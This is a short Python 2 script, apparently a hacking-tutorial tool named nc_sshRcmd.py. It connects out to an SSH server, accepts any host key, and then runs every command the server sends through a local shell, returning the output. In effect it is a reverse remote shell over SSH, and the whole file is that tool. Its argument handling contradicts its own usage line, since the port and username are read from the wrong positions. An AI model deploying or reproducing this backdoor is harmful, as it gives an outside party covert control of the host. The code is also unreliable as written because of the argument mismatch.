#!/usr/bin/env python

import threading
import paramiko
import subprocess
import sys


def ssh_command(ip, user, passwd, port, command):
    client = paramiko.SSHClient()
    
    # client.load_host_keys("~/.ssh/known_hosts")
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print "%s, %s, %s" % (user, passwd, str(port))
    client.connect(ip, username=user, password=passwd, port=port)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024) # read banner
        
        while True:
            command = ssh_session.recv(1024) # get command from SSH server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                if not cmd_output:
                    ssh_session.send("Command executed successfully!")
                else:
                    ssh_session.send(cmd_output)
            except Exception,e:
                ssh_session.send(str(e))
            
        client.close()
    return


def main():
    if len(sys.argv[1:]) != 4:
        print "Usage ./nc_sshRcmd.py [ip] [user] [password] [sshPort]"
        print "Example: ./nc_sshRcmd.py 192.168.0.10 user p@ssw0rd1 2222"
        sys.exit(0)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    password = sys.argv[4]
    
    ssh_command(ip, username, password, port, 'ClientConnected')


main()

